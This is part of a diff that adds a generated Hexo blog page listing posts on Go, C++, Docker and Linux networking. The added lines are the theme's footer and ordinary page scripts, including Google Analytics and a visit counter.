标准库解决方案(8.总结-功成身退)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e3c9a06b/">Golang: 标准库解决方案(7.Concurrency)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/bb600d10/">Golang: 标准库解决方案(6.REST & JSON API)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/2f5310cf/">Golang: 标准库解决方案(5.Web Server & Client)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/40bd3fcc/">Golang: 标准库解决方案(4.Math/Time/Archives/Images)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/fedfbade/">Golang: 标准库解决方案(3.处理BuildTools,IO,Error)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/42e1a67a/">Golang: 标准库解决方案(2.处理Strings,Bytes,Runes)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/461f0c5f/">Golang: 标准库解决方案(1.听两位大师讲标准库)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/dbbca7df/">Golang: WebGoGoGo(0.Web编程的方方面面)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/187d6c5a/">Golang: WebGoGoGo(0.概述Web编程)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/94df7563/">Golang: Here We Go(5.孰能生巧-Oreilly大师讲解&再练习)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/53a29a57/">Golang: RobPike谈 并发Vs并行</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/9b9dc4cb/">Golang: One Video Golang</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/9d17f938/">Golang: 标准库解决方案(0.总起)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e5c13927/">Golang: Think in Golang</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/514585e8/">Golang: Here We Go(4.功成身退-资料&面试题)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/4f07614d/">Golang: Here We Go(3.登堂入室-全部语法&大量练习)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/872df2cf/">Golang: Here We Go(2.常用命令&代码结构&语法大纲)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/51cffabe/">Golang: Here We Go(1.安装&&脚本)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/d740c2ec/">Golang: Here We Go(0.Google工程师介绍)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/590c21ce/">V-skills 专栏指南</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/df51d2c/">技巧: Hexo 置顶问题解决</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/4111adcd/">技巧: WordPress 迁移&备份技巧</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/d61966e4/">略懂: Nginx 折腾</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/12cc604a/">技巧: WordPress upload 最终解决方案</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/173f9602/">技术: 深耕 Docker 生态圈(十一){Docker 实践}</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/5ac3e07f/">技巧: Wordpress 网页(h5) mp4 兼容问题</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/65a942dd/">技术: 深耕 Docker 生态圈(十一){Docker 三剑客}</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/a30c0f5f/">技术: 深耕 Docker 生态圈(十){私有仓库配置}</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/c73a742c/">技术: 深耕 Docker 生态圈(九){Docker 数据管理}</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/19c3a85f/">技术: 深耕 Docker 生态圈(八){Docker 网络部分}</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/b3512db9/">技术: 深耕 Docker 生态圈(七){Docker 的底层实现}</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/cd70a238/">技术: 深耕 Docker 生态圈(六){Dockerfile 文法}</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/36bc3b47/">技术: 深耕 Docker 生态圈(五){自己构建的镜像为何这么大}</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/cb3fb6f1/">技术: 深耕 Docker 生态圈(四){镜像存储在哪}</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e0391b88/">技术: 深耕 Docker 生态圈(三){Docker 指令}</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/8abfca36/">技术: 深耕 Docker 生态圈(二){配置 Docker }</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/70ca69ad/">技术: 深耕 Docker 生态圈(一){总起:安装环境}</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/9724f8c0/">传送门(Gate)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/683530b4/">略懂: Docker 镜像与容器</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/ab11b0d1/">略懂: 软件架构模式</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e1b58964/">技术: Sqlite 主键自增(Python接口)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/121fc86a/">技巧: 迁移博客到 VPS (借助hook)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/337aa775/">略懂: 我所认识的 Nodejs</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/f8bb990d/">技巧: iOS 原生客户端配置 Gmail</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/ecd9f8c2/">略懂: 前端相关的缓存技术</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/9b49ffe2/">Golang: 深入探究 Golang 并发</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/5009ef69/">技巧: macOS 录屏保存为 gif 格式</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/85a160b/">技巧: Numbers(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/d3fb236/">Golang: Golang 代码走廊</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/16ca5b11/">技巧: Git 多账户工作技巧</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/7fcc01c2/">技巧: macOs下Qt的Mysql驱动处理</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e1b7f878/">技术: Qt 汇总篇</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/15783ed7/">技巧：Makefile相关</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/ad67147c/">技巧: HEXO优雅操作</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/aa213556/">技巧: macOS中替换rm命令</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/ef21388e/">技术: 股票分析客户端分析与实现</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/38fb8eb9/">技术: 网络编程部分汇总</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/a7d41a1/">技术: C++最终篇</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/ba598705/">技术: Emacs环境配置</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/3549e702/">技术: Deepin Linux环境配置</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/1345f1a4/">技术: 网络吞吐量测试</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/65b929a8/">技术: 浅谈我经历的敏捷</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/8804d39c/">技术: 网络开发常用工具</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/6acc3344/">技术: Thrift</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/8276c32/">技术: rapid-json</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/17d1767e/">技术: Rapid Xml</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/7d13442/">技术: Protocol buffer</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/140bfd50/">技术: Gtest测试框架</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/247b42a4/">技术: 多线程调试问题</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/d48acbe2/">技术: TDD 开发模式实践</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/47fb15b8/">技术: 一个HTTPd的简单实现</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/c62cfa29/">技术: C++网络库(轮子)大杂烩</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/9d5b3554/">技术: Asio 异步IO库</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e5af6e18/">技术: Boost库</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/3cd43f14/">技术: Unix Domain Socket</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/87cd3741/">技术: 百万连接问题</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/1d57da8b/">技术: C++ 实现线程池模型</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/6b518c8a/">技术: 服务端网络模型</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e42d6398/">技术: UDP 模型网络编程</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/224e60da/">技术: TCP 模型网络编程</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/df7a2188/">技术: TCP流解析(粘包和拆包问题)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/1334152b/">技术: Epoll 模型</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/8967f437/">技术: Linux 基础套接字模型</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/81fba862/">技术: Linux网络学习参考</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/a4602dea/">技术: Linux网络IO模型</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/cf64f3cd/">技术: Shell代码规范</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/33327382/">技术: 开源协议</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/be94ecde/">技术: Git 代码规范</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/1a10be5a/">技术: Python代码规范</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/cc8315f3/">技术: 高质量Git工作</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/3a357315/">技术: Python语言</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/82524a2d/">技术: Qt 网络编程案例汇总</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/a46fcd49/">技术: Qt 线程案例汇总</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e3b79a82/">技巧: linux下查看二进制文件</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/5d0a2cfa/">技术: Qt 实践(汽车销量管理)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/77d8483b/">技巧: Qt 快捷键</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/75110831/">技术: JNI</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/fdc9b2b9/">技术: C++编程之time问题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e6ff0a80/">技术: C++11 Lambda 再探究</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/b84fe139/">技术: 对比 Linux 下并发库</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/322ce852/">技术: C++11 特性补充</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/189d21c8/">技术: benchmark(lambda 和 bind)</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/97d0104d/">技术: C++11 可调用对象function总结</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/d12695b6/">技术: C++11 std::ref 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/b43344a7/">技术: C++ 智能指针实现</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/4ead806a/">技术: C++11 Bind 探究</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/9ef88011/">技术: C++ RAII 相关技术总结</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/bb36bf0d/">技术: C++11 Lambda 探究</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/4b19001a/">技术: Linux Bin Utils</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/31dce1ea/">技术: C++ 智能指针</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/88802625/">技术: Linux 静态&动态库</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/ab21303c/">技术: C++11 并发库</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/bc67b8cb/">技术: 探究一下STL常用算法</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/640d4b5f/">技术: Linux 编程三大件儿</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/24da8a94/">技术: C++ 迭代器失效问题</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e53c44b8/">技术: C++ 标准库 STL</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/f4144d45/">技术: C++非面向对象部分</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/f8283c77/">技术: C++面向对象部分</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/be09a73/">技术: 设计模式 C++ 实现</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/956ee661/">技术: mysql-connector-cpp</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/b0dbc55e/">技术: 带有移动语义的 C++ 字符串类</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/f306f9f9/">技术: C++11 右值相关问题探讨</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e9705375/">技术: C++11 类型萃取</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/d93a00e8/">技术: C++11 异常争论</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/b7fe58b8/">技术: C++11 模板别名探究</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/72ae9d55/">技术: C++11 默认函数问题探究</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/a8af70c7/">技术: C++11 auto和decltype总结</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/c8bce253/">技术: Java中正则表达式支持</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/866a6247/">技术: Python中正则表达式的支持</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/8ebc387/">技术: C++中正则表达式的支持</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/50c77f46/">技术: C语言中正则表达式的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/aea53521/">技术: C++11 tuple 容器</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/656a02b/">技术: C++11 hashtable 结构</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/4bb5bf03/">技术: C++11 一致性初始化探究</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/e6f297fb/">技术: C++11 RangeFor探究</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/70b6b9e7/">技术: C++11 explicit注意事项</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/919162f1/">技术: C++11 nullptr探究</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/b744aae/">技术: C++11变长参数模板</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/5f4ce2b/">技术: 探究 Linux 线程</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/1312cbe7/">技术: 探究 Linux 进程</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/1d2bfb39/">技术: Posix标准一览</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/a00e5a90/">隐修者(里程碑)</a></li></ul>
+
+
+
+
+    <script>
+        
+            yiliaConfig.fancybox = false;
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2015-2018 &nbsp Merlin
+            </div>
+            <div class="footer-right">
+                 blog&nbsp<b>version: </b> &nbsp<a href= "https://github.com/WizardMerlin/Gate#blog版本分支说明" >2.4</a>    <i class="fa fa-heart animated infinite pulse"></i>&nbsp高效流
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-110654443-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "Do One Thing......" + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "Do It Well......" + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
